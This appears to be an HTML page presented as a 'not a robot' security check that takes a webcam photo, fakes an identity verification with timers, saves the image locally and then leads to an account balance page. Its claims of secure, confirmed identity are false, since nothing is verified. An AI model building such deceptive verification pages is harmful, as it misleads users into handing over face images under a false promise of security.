<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify You're Not a Robot</title>
    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/face-api.js/1.3.0/face-api.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #000;
            color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.8);
            border: 3px solid gold;
            border-radius: 15px;
            padding: 30px;
            max-width: 500px;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
        }
        h2 {
            color: gold;
            margin-bottom: 20px;
        }
        .camera-frame {
            width: 300px;
            height: 300px;
            margin: 0 auto;
            border: 2px solid gold;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
            background-color: #111;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        canvas {
            display: none;
        }
        .btn {
            background-color: gold;
            color: black;
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin: 15px 5px;
            transition: all 0.3s;
        }
        .btn:hover {
            background-color: #ffd700;
            box-shadow: 0 0 10px gold;
        }
        .btn-transparent {
            opacity: 0.5;
            pointer-events: none;
        }
        .btn-active {
            opacity: 1;
            pointer-events: auto;
            background-color: gold;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 215, 0, 0.2);
            border-top: 5px solid gold;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        .verification-text {
            margin: 15px 0;
            color: #ccc;
        }
        .security-badge {
            color: gold;
            font-size: 14px;
            margin-top: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Security Verification</h2>
        <p class="verification-text">Please verify you're not a robot by taking a photo</p>
        
        <div class="camera-frame">
            <video id="camera" autoplay playsinline></video>
            <canvas id="canvas"></canvas>
        </div>
        
        <p class="security-badge">ðŸ”’ Secure Identity Verification</p>
        
        <button id="capture-btn" class="btn" onclick="capturePhoto()">Take Photo</button>
        <div id="loading" class="loader"></div>
        
        <button id="go-to-balance" class="btn btn-transparent" onclick="goToBalance()">Access Your Account</button>
    </div>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const goToBalanceBtn = document.getElementById('go-to-balance');
        const loadingSpinner = document.getElementById('loading');

        // Start camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("Camera access error:", err);
                alert("Could not access camera. Please enable camera permissions.");
            });

        // Capture photo function
        function capturePhoto() {
            // Disable capture button during process
            document.getElementById('capture-btn').disabled = true;
            loadingSpinner.style.display = "block";
            
            // Show verification message
            document.querySelector('.verification-text').textContent = "Verifying your identity...";
            
            // Capture after 2 seconds (simulate processing)
            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Save photo to localStorage (simulated)
                const photoData = canvas.toDataURL('image/png');
                localStorage.setItem('verificationPhoto', photoData);
                
                // Complete verification after 3 more seconds
                setTimeout(() => {
                    loadingSpinner.style.display = "none";
                    document.querySelector('.verification-text').innerHTML = 
                        "âœ“ Verification complete<br><small>Identity confirmed</small>";
                    
                    // Enable and highlight the access button
                    goToBalanceBtn.classList.remove('btn-transparent');
                    goToBalanceBtn.classList.add('btn-active');
                    
                    // Change capture button text
                    document.getElementById('capture-btn').textContent = "Retake Photo";
                    document.getElementById('capture-btn').disabled = false;
                }, 3000);
            }, 2000);
        }

        // Go to balance page
        function goToBalance() {
            window.location.href = "balance.html";
        }
    </script>

</body>
</html>
